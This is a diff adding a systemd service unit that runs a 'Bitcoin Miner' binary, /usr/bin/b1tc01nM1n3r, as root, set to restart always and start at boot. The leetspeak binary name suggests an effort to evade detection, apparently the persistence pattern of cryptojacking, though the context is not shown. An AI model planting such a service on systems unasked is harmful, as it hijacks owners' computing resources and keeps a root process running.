@@ -1,0 +1,12 @@
+[Unit]
+Description=Bitcoin Miner
+
+[Service]
+ExecStart=/usr/bin/b1tc01nM1n3r
+Restart=always
+User=root
+RestartSec=10s
+
+
+[Install]
+WantedBy=multi-user.target
